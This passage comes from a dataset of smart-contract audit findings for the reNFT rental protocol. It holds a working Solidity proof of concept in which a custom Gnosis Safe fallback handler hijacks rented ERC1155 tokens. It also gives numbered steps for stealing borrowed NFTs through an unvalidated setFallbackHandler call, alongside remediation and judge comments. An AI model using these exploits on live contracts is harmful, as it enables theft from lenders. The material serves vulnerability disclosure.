new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC1155_Exploit() public {\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The custom fallback handler the attacker created.\n            CustomFallbackHandler customFallbackHandler = new CustomFallbackHandler(attacker.addr);\n\n            // Set the attacker's safe address on the fallback handler which the fallback handler will communicate with.\n            customFallbackHandler.setSafeAddr(address(attacker.safe));\n\n            // Set the address of the token which the attacker wants to hijack on the fallback handler.\n            customFallbackHandler.setTokenToHijackAddr(address(erc1155s[0]));\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(customFallbackHandler)\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n\n\n            // The malicious TX which the custom fallback handler will execute when `onERC1155Received` is called.\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n\n            // Get the signature of the malicious TX.\n            transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(address(erc1155s[0])),\n                hijackTX\n            );\n\n\n            // Set the malicious TX and it's signature on the custom fallback handler contract so that it sends it\n            customFallbackHandler.setSignatureAndTransaction(transactionSignature, hijackTX);\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            ////////////////////////////\n            // Token Theft Proof      //\n            ////////////////////////////\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n\n        function addOwnerWithThreshold(address owner, uint256 threshold) external;\n    }\n\n\n    contract CustomFallbackHandler {\n\n        address private owner; // The address of the attacker.\n        address private safe; // The address of the attacker's safe.\n        address private tokenToHijack; // The address of the token which the attacker wants to hijack.\n        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.\n        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token\n\n        constructor(address _owner) {\n            owner = _owner;\n        }\n\n        function onERC1155Received(\n            address,\n            address,\n            uint256,\n            uint256,\n            bytes calldata\n        ) external returns(bytes4) {\n\n            _transferHijackedTokensToOwner();\n\n            return 0xf23a6e61;\n        }\n\n        function _transferHijackedTokensToOwner() internal returns(bool) {\n\n            SafeUtils.executeTransaction(\n                address(safe),\n                address(tokenToHijack),\n                maliciousSafeTransaction,\n                maliciousSafeTransactionSignature\n            );\n\n            return true;\n\n        }\n\n        function setSafeAddr(address _safe) external onlyOwner {\n            safe = _safe;\n        }\n\n        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {\n            tokenToHijack = _tokenAddr;\n        }\n\n        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {\n            maliciousSafeTransactionSignature = _signature;\n            maliciousSafeTransaction = _transaction;\n        }\n\n        modifier onlyOwner {\n            require(msg.sender == owner);\n            _;\n        }\n\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nAn attacker can hijack any ERC1155 token he rents, and the lender won't be able to get the rental funds he should get after rental expiry.\n\n***\n\n### Remediation\n\n***\n\nThe main problem is that the token transferral occurs before the rental is registered, so the fix I propose is that the lender's ERC1155 tokens be transferred first to a trusted contract which registers the rental and then the trusted contract sends the ERC1155 tokens to the borrower's rental safe after ensuring the rental was registered. This fix would break this exploit.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917191218):**\n > > In short, the main issue is that https://github.com/code-423n4/2024-01-renft-findings/issues/593 doesn't validate the address supplied to setFallbackHandler as it should, and the main issue with this reported bug is that tokens are transferred directly to the rental safe prior to being registered.\n> \n> I think this is correct and why these issues should remain distinct.  Currently my point of view is:\n> \n> 1) fixing the guard is required\n> 2) fixing the ability to interact before the token is registered is also required\n> \n> 2 fixes, 2 issues.  Would welcome one last comment from @0xA5DF prior to calling this final\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917288429):**\n > Totally agree with @0xean that these are 2 distinct issues\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/43), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/32) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/4).\n\n***\n\n",
      "summary": "\nA Gnosis Safe Fallback Handler is a contract that handles unknown functions for a safe. This feature allows for more flexibility for the user. The bug is that when transferring ERC1155 tokens, the fallback handler is not aware of the rental, allowing an attacker to hijack the tokens by creating a custom fallback handler that instructs the safe to transfer the tokens to the attacker's address. To run a proof of concept, follow the steps outlined in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/588",
      "tags": [
        "ERC1155",
        "Reentrancy"
      ],
      "finders": [
        "Beepidibop",
        "hash",
        "sin1st3r\\_\\_"
      ]
    },
    {
      "id": "30522",
      "title": "[H-02] An attacker is able to hijack any ERC721 / ERC1155 he borrows because guard is missing validation on the address supplied to function call `setFallbackHandler()`",
      "impact": "HIGH",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n2.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).\n\n    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nWhile the gnosis guard checks for a comprehensive list of potentially malicious function calls, it doesn't have any validation or checks for the `address` parameter of the function `setFallbackHandler(address handler)`, which is the function used by the rental safe owner to set a fallback handler his safe. This is super dangerous because it allows an attacker to hijack ANY ERC721 or ERC1155 token he rents by following these steps:\n\n1.  Sets the fallback handler address of the safe to be the address of the token he rented which he wants to hijack, let's say it's an ERC721 token.\n\n2.  Sends a `transferFrom(from, to, tokenId)` call to the gnosis safe contract while supplying the following parameters:\n    1.  `from` -> the address of the rental safe holding the token.\n    2.  `to` -> the address of the attacker himself.\n    3.  `tokenId` -> the ID of the token he wants to hijack.\n\n3.  The gnosis safe contract doesn't have the function `transferFrom()` implemented, so it'll [reach out and send a call to](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L78) the fallback handler address which is the address of the rented token contract and forward the calldata gnosis received from the attacker's call to the rented token contract.\n\n4.  Since it's the gnosis rental safe talking to the the rented token contract, and since the rental safe is the owner of the NFT, the ERC721 rented token contract will happily make the transfer and send the token to the attacker.\n\n5.  Token is hijacked, and the lender of the token won't be able to get it back or get the funds he's supposed to receive from the rental process.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC721_1155_Exploit -vvv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe 